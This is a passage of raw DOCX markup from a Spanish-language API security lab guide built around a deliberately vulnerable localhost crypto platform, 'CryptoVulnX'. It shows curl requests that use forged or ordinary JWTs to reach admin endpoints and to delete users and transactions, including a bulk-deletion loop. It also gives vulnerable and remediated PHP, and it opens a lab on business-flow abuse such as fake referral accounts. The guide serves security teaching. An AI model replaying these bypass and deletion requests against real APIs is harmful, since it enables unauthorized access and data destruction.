        <w:t>Paso 3 - Acceder al panel de administracion con el JWT forjado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Listar todos los usuarios del sistema</w:t>
        <w:br/>
        <w:t>curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_FORJADO_ADMIN&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "users": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 1, "username": "admin", "email": "admin@cryptovulnx.com", "role": "admin", "kyc_verified": 1},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 2, "username": "maria", "email": "maria@example.com", "role": "user", "kyc_verified": 1},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 3, "username": "carlos", "email": "carlos@example.com", "role": "user", "kyc_verified": 0}</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>El endpoint confía en el claim `role` del JWT sin verificar contra la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 3 - DELETE sin Verificacion de Admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Autenticarse como usuario normal y obtener token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"carlos","password":"carlos2024"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Intentar GET a admin endpoint (deberia fallar)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_NORMAL_CARLOS&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "error": "Acceso denegado. Se requiere rol de administrador."</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Usar DELETE con el mismo token normal (funciona)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Eliminar un usuario con token de usuario normal</w:t>
        <w:br/>
        <w:t>curl -s -X DELETE "http://localhost/appsec/api/v1/admin/users.php?id=2" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_NORMAL_CARLOS&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Usuario con ID 2 eliminado exitosamente"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>El metodo DELETE no verifica si el usuario es administrador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 4 - Eliminar transacciones con token de usuario normal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Eliminar una transaccion</w:t>
        <w:br/>
        <w:t>curl -s -X DELETE "http://localhost/appsec/api/v1/admin/transactions.php?id=5" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_NORMAL_CARLOS&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Transaccion con ID 5 eliminada exitosamente"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 5 - Eliminar multiples registros con un script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Eliminar todos los usuarios excepto el propio</w:t>
        <w:br/>
        <w:t>for id in 1 2 4 5; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  echo "[*] Eliminando usuario $id..."</w:t>
        <w:br/>
        <w:t xml:space="preserve">  curl -s -X DELETE "http://localhost/appsec/api/v1/admin/users.php?id=$id" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H "Authorization: Bearer &lt;TOKEN_NORMAL_CARLOS&gt;"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  echo ""</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Verificar Rol desde la Base de Datos, No desde el JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Confiar en el claim del JWT</w:t>
        <w:br/>
        <w:t>$decoded = JWT::decode($token, new Key($secret, 'HS256'));</w:t>
        <w:br/>
        <w:t>if ($decoded-&gt;role !== 'admin') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Acceso denegado"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Verificar rol en la base de datos</w:t>
        <w:br/>
        <w:t>$decoded = JWT::decode($token, new Key($secret, 'HS256'));</w:t>
        <w:br/>
        <w:t>$user_id = $decoded-&gt;sub;</w:t>
        <w:br/>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT role FROM users WHERE id = ? AND active = 1");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("i", $user_id);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>$result = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!$result || $result['role'] !== 'admin') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Acceso denegado. Se requieren privilegios de administrador."]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Autorizacion Consistente para Todos los Metodos HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Solo verifica GET</w:t>
        <w:br/>
        <w:t>if ($_SERVER['REQUEST_METHOD'] === 'GET') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    verifyAdminRole($token); // Solo aplica a GET</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Sin verificacion de admin</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $id = $_GET['id'];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $conn-&gt;query("DELETE FROM users WHERE id = $id");</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Middleware de autorizacion que aplica a todos los metodos</w:t>
        <w:br/>
        <w:t>function requireAdmin() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    global $conn;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $token = getBearerToken();</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if (!$token) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(401);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "Token de autenticacion requerido"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $decoded = JWT::decode($token, new Key(getenv('JWT_SECRET'), 'HS256'));</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $user_id = $decoded-&gt;sub;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // Verificar en base de datos</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt = $conn-&gt;prepare("SELECT role FROM users WHERE id = ? AND active = 1");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;bind_param("i", $user_id);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $user = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if (!$user || $user['role'] !== 'admin') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            echo json_encode(["error" =&gt; "Privilegios de administrador requeridos"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return $decoded;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    } catch (Exception $e) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(401);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "Token invalido"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Aplicar a TODOS los metodos al inicio del archivo admin</w:t>
        <w:br/>
        <w:t>$admin_user = requireAdmin(); // Se ejecuta para GET, POST, PUT, DELETE, etc.</w:t>
        <w:br/>
        <w:br/>
        <w:t>switch ($_SERVER['REQUEST_METHOD']) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    case 'GET':</w:t>
        <w:br/>
        <w:t xml:space="preserve">        listUsers();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    case 'DELETE':</w:t>
        <w:br/>
        <w:t xml:space="preserve">        deleteUser($_GET['id'], $admin_user);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    default:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(405);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "Metodo no permitido"]);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Proteger o Eliminar Endpoint de Debug</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - debug.php sin autenticacion</w:t>
        <w:br/>
        <w:t>if ($_GET['action'] === 'info') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "database" =&gt; ["host" =&gt; "db", "password" =&gt; "Sup3rS3cr3tDB!"],</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "jwt" =&gt; ["secret" =&gt; "crypto123"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ]);</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Opcion 1: Eliminar el endpoint en produccion</w:t>
        <w:br/>
        <w:t>// Simplemente eliminar debug.php del servidor de produccion</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Opcion 2: Si es necesario para desarrollo, proteger adecuadamente</w:t>
        <w:br/>
        <w:t>if (getenv('APP_ENV') !== 'development') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(404);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Recurso no encontrado"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Requiere autenticacion de admin incluso en desarrollo</w:t>
        <w:br/>
        <w:t>$admin_user = requireAdmin();</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Nunca exponer credenciales completas</w:t>
        <w:br/>
        <w:t>$debug_info = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "php_version" =&gt; phpversion(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "server_time" =&gt; date('c'),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "api_version" =&gt; "1.0",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // NO incluir credenciales, secretos ni informacion sensible</w:t>
        <w:br/>
        <w:t>];</w:t>
        <w:br/>
        <w:t>echo json_encode($debug_info);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Implementar Control de Acceso Basado en Roles (RBAC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Middleware RBAC centralizado</w:t>
        <w:br/>
        <w:t>class Authorization {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    private static $permissions = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'admin' =&gt; ['users.list', 'users.delete', 'transactions.list', 'transactions.delete', 'debug.view'],</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'user'  =&gt; ['wallet.view_own', 'transactions.view_own', 'kyc.upload_own'],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    public static function require(string $permission): object {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $token = getBearerToken();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $decoded = JWT::decode($token, new Key(getenv('JWT_SECRET'), 'HS256'));</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // Obtener rol REAL de la base de datos</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $role = self::getRoleFromDB($decoded-&gt;sub);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if (!isset(self::$permissions[$role]) || !in_array($permission, self::$permissions[$role])) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            echo json_encode(["error" =&gt; "No tienes permiso para realizar esta accion"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        return $decoded;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    private static function getRoleFromDB(int $user_id): string {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        global $conn;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt = $conn-&gt;prepare("SELECT role FROM users WHERE id = ? AND active = 1");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;bind_param("i", $user_id);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $result = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return $result ? $result['role'] : 'none';</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Uso en endpoints</w:t>
        <w:br/>
        <w:t>// admin/users.php</w:t>
        <w:br/>
        <w:t>if ($_SERVER['REQUEST_METHOD'] === 'GET') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Authorization::require('users.list');</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // ... listar usuarios</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Authorization::require('users.delete');</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // ... eliminar usuario</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Principios de Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verificar roles en la base de datos</w:t>
      </w:r>
      <w:r>
        <w:t>: Nunca confiar en claims del JWT para decisiones de autorizacion. El JWT sirve para identificar al usuario; el rol se verifica en la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Autorizacion consistente</w:t>
      </w:r>
      <w:r>
        <w:t>: Aplicar las mismas verificaciones de autorizacion a todos los metodos HTTP de un endpoint (GET, POST, PUT, DELETE).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Middleware centralizado</w:t>
      </w:r>
      <w:r>
        <w:t>: Implementar la logica de autorizacion en un middleware reutilizable, no en cada endpoint individualmente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Eliminar endpoints de debug</w:t>
      </w:r>
      <w:r>
        <w:t>: No desplegar endpoints de debug en produccion. Si son necesarios, protegerlos con autenticacion fuerte.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Principio de minimo privilegio</w:t>
      </w:r>
      <w:r>
        <w:t>: Cada usuario solo debe poder ejecutar las funciones estrictamente necesarias para su rol.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Denegar por defecto</w:t>
      </w:r>
      <w:r>
        <w:t>: Si no hay una regla explicita que permita el acceso, denegarlo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 06 - Acceso No Restringido a Flujos de Negocio Sensibles</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API6:2023 - Unrestricted Access to Sensitive Business Flows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar la ausencia de controles en flujos de negocio criticos de la plataforma CryptoVulnX para obtener ganancias ilicitas mediante:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Arbitraje automatizado de criptomonedas mediante swaps rapidos sin cooldown.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Abuso del sistema de referidos creando multiples cuentas falsas para acumular bonificaciones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad API6:2023 se produce cuando una API expone flujos de negocio sensibles sin implementar mecanismos que limiten su uso automatizado o abusivo. A diferencia de los controles de autorizacion tradicionales, aqui el problema no es *quien* accede, sino *como* y *con que frecuencia* se accede.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En el contexto de una plataforma fintech/crypto como CryptoVulnX, existen dos flujos criticos que carecen de proteccion:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
